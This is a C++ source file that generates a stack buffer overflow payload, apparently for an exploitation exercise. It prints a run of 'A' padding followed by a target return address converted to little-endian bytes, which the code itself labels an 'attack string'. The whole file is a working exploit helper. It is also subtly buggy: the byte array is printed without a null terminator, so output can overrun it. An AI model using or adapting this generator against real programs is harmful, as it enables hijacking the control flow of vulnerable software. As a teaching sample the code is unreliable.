#include <iostream>
#include <string>
#include <stdlib.h>

using namespace std;

int main(int argc, char const *argv[]){
	if(argc < 2 ){
		cerr << "Usage: " << argv[0] << " <BIG_ENDIAN_ADDRESS> [<PADDING_AMT>]" << endl;
		return 1;
	}

	// Padding
	int pad_amt = argc == 3 ? atoi(argv[2]) : 112;
	string pad(pad_amt, 'A');

	// Convert address to little endian char
	string address(argv[1]);
	if(address[0] == '0' && address[1] == 'x')
		address = address.substr(2, address.length());
	if(address.length() != 8){
		address = '0' + address;
	}

	int len = address.length();
	unsigned char lil_endian_ascii[4];
	for(int i = len-2, x = 0; i >= 0; i-=2, x++){
	    string byte = address.substr(i,2);  
	    unsigned char chr = (unsigned char)(int)strtoul(byte.c_str(), NULL, 16);
	    lil_endian_ascii[x] = chr;
	}

	// print attack string
	cout <<  pad << lil_endian_ascii << endl;

	return 0;
}